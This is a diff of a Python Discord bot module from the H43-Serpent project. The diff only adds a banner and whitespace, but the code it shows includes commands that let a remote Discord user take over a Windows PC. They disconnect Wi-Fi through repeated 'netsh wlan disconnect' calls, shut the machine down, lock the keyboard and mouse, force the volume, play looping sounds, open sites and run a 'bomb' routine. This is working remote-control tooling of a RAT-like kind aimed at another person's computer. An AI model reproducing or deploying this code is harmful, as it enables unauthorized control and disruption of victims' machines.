@@ -1,4 +1,11 @@
-'''
+'''                                                
+ _____ ___ ___     _____                     _   
+|  |  | | |_  |___|   __|___ ___ ___ ___ ___| |_ 
+|     |_  |_  |___|__   | -_|  _| . | -_|   |  _|
+|__|__| |_|___|   |_____|___|_| |  _|___|_|_|_|  
+                                |_|              
+
+
 Author: Fytex
 REPO: https://github.com/Fytex/H43-Serpent
 '''
@@ -42,6 +49,7 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
 
 class Lib(commands.Cog):
+
     def __init__(self, bot):
         self.bot = bot
         self.tmp_sound = None
@@ -53,17 +61,20 @@ class Lib(commands.Cog):
             IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
         self.volume = cast(interface, POINTER(IAudioEndpointVolume))
 
+
     @commands.command()
     async def hello(self, ctx, *, member: discord.Member = None):
         """Says hello"""
         member = member or ctx.author
         await ctx.send(f'Welcome summoner,  {member.name}~ Hehehe :)')
 
+
     @commands.command()
     async def off_wifi(self, ctx, time_sec:int = 1):
         for i in range(time_sec):
             os.system('netsh wlan disconnect')
             await time.sleep(1)
+
 
     @commands.command()
     async def shutdown(self, ctx, time_sec:int = 0):
@@ -135,10 +146,7 @@ class Lib(commands.Cog):
                 cmd()
 
             await asyncio.sleep(0.3)
-                
-
-
-                
+                        
 
     @commands.command()
     async def site(self, ctx, url):
@@ -156,7 +164,6 @@ class Lib(commands.Cog):
         flags = winsound.SND_ASYNC | winsound.SND_ALIAS
         if loop:
             flags |= winsound.SND_LOOP
-
 
         # Avoid conflicts: Stop before replacing temporary file
         if self.tmp_sound:
@@ -190,6 +197,7 @@ class Lib(commands.Cog):
         self.keyboard_listener = pynput.keyboard.Listener(suppress=True)
         self.keyboard_listener.start()
 
+
     @commands.command()
     async def unlock_input(self, ctx):
         # Enable mouse and keyboard events
@@ -201,16 +209,19 @@ class Lib(commands.Cog):
             self.keyboard_listener.stop()
             self.keyboard_listener = None
 
+
     @commands.command()
     async def set_volume(self, ctx, value:int):
         _min, _max , *_ = self.volume.GetVolumeRange()
         self.volume.SetMasterVolumeLevel(_min if not value else _max, None)
+
 
     @commands.command()
     async def image(self, ctx):
         if ctx.message.attachments:
             data = await ctx.message.attachments[0].read()
             Image.open(io.BytesIO(data)).show()
+
 
     @commands.command()
     async def bomb(self, ctx, level:int=1, time_sec:int=10):
@@ -249,5 +260,3 @@ class Lib(commands.Cog):
 
 async def setup(bot):
     await bot.add_cog(Lib(bot))
-
-
